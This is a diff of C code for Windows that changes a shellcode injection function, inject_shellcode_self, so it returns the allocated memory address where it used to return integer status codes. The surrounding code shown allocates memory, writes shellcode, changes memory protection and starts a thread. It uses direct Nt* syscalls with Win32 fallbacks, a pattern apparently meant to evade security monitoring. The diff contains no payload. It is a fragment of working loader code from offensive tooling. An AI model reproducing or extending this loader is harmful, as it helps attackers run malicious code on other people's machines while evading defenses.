@@ -68,7 +68,7 @@ void my_init_syscalls_list(void) {
     #endif
 }
 
-int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThread, BOOL wait, unsigned int sleep_time) {
+LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThread, BOOL wait, unsigned int sleep_time) {
     #ifdef _DEBUG_
         if (sleep_time > 0)
             printf("sleeping for %d seconds!\n", sleep_time);
@@ -82,7 +82,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
             #ifdef _DEBUG_
                 printf("ERROR: NtDelayExecution = 0x%x\n", status);
             #endif
-            return -1;
+            return NULL;
         }
     #else
         Sleep(sleep_time);
@@ -115,7 +115,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: NtAllocateVirtualMemory = 0x%x\n", status);
                 #endif
-                return -1;
+                return NULL;
             }
         #else
             allocation = VirtualAllocEx(
@@ -133,7 +133,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: VirtualAllocEx = 0x%x\n", GetLastError());
                 #endif
-                return -1;
+                return NULL;
             }
         #endif
 
@@ -156,7 +156,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: NtWriteVirtualMemory = 0x%x\n", status);
                 #endif
-                return -1;
+                return NULL;
             }
         #else
             BOOL res = WriteProcessMemory(
@@ -170,7 +170,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: WriteProcessMemory = 0x%x\n", GetLastError());
                 #endif
-                return -1;
+                return NULL;
             }
         #endif
 
@@ -193,7 +193,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: NtProtectVirtualMemory = 0x%x\n", status);
                 #endif
-                return -1;
+                return NULL;
             }
             #else
             res = VirtualProtectEx(
@@ -207,7 +207,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: VirtualProtectEx = 0x%x\n", GetLastError());
                 #endif
-                return -1;
+                return NULL;
             }
             #endif
         #endif
@@ -239,7 +239,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: NtCreateThreadEx = 0x%x\n", status);
                 #endif
-                return status;
+                return NULL;
             }
         #else
             *phThread = CreateRemoteThread(
@@ -256,7 +256,7 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
                 #ifdef _DEBUG_
                 printf("ERROR: CreateRemoteThread = 0x%x\n", GetLastError());
                 #endif
-                return -1;
+                return NULL;
             }
         #endif
 
@@ -275,6 +275,6 @@ int inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThre
             #endif
         }
 
-        return 0;
+        return allocation;
     #endif
 }
